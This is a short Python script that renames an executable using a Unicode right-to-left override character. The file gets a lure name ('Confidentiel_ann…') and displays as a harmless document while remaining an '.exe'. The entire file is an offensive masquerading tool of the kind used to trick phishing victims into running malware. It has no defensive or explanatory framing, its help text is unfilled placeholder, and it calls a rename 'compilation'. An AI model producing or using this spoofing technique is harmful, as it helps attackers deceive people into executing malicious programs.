import os
import sys
import argparse

def parse():
	parser = argparse.ArgumentParser(
                    prog='ProgramName',
                    description='What the program does',
                    epilog='Text at the bottom of help')
	parser.add_argument('-f', '--executable-filename')
	parser.add_argument('-O', '--input-format')
	return parser.parse_args()

args = parse()
filename = args.executable_filename
extension = args.input_format
rtlo_filename = f'Confidentiel_ann\u202E{extension[::-1]}.exe'


os.rename(filename, rtlo_filename)
print(f"[+] Compilation terminé : {rtlo_filename}")
